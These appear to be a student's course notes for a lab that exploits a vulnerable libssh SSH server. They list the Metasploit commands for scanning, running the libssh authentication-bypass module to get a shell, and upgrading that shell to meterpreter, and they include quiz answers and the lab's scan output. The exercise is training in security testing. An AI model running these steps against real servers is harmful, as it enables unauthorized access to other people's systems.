- Secure Shell 
- Successor to Telnet
- Port 22 by default
- libssh V0.6.0-0.8.0 is vulnerable


Setup msfconsole
```
service postgresql start
msfconsole
setg RHOSTS <target_ip>
setg LHOST <local_ip>
```

Scan and Enumerate 
```
db_nmap -sS -sV -O <target_ip>
```

Exploit with libssh auxiliary module
```
search libssh
use auxiliary/scanner/ssh/libssh_auth_bypass
options
set SPAWN_PTY true
set CMD bash ? 
exploit
```

Upgrade shell to meterpreter 
```
search shell_to 
use post/multi/shell_to_meterpreter 
set SESSION <session_id>
exploit
```
## Quiz

Which one of the following Nmap scans can be used to enumerate the version of SSH running on a target?

	nmap -sS -sV -p 22 10.10.10.1

The "auxiliary/scanner/ssh/libssh_auth_bypass" module can be used to spawn a TTY session on the target system, which of the following module options can be used to spawn a TTY session after running the module?

	set SPAWN_PTY true

## Lab

The target server as described below is running a vulnerable SSH server. Your task is to fingerprint the application using command line tools available on the Kali terminal and then exploit the application using the appropriate Metasploit module. Get a Meterpreter shell on the target!

Instructions:Â 

- This lab is dedicated to you! No other users are on this network :)
- Once you start the lab, you will have access to a root terminal of a Kali instance
- Your Kali has an interface with IP address 192.X.Y.Z. Run "ip addr" to know the values of X and Y.
- The target server should be located at the IP address 192.X.Y.3.
- Do not attack the gateway located at IP address 192.X.Y.1
- postgresql is not running by default so Metasploit may give you an error about this when starting

```
Local IP: 192.43.43.2
Remote IP: 192.43.43.3
```

```
 db_nmap -Pn  -sS -sV -O 192.43.43.3

22/tcp open  ssh     (protocol 2.0)

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
[*] Nmap: SF-Port22-TCP:V=7.70%I=7%D=1/27%Time=65B50370%P=x86_64-pc-linux-gnu%r(NULL
[*] Nmap: SF:,16,"SSH-2\.0-libssh_0\.8\.3\r\n");
```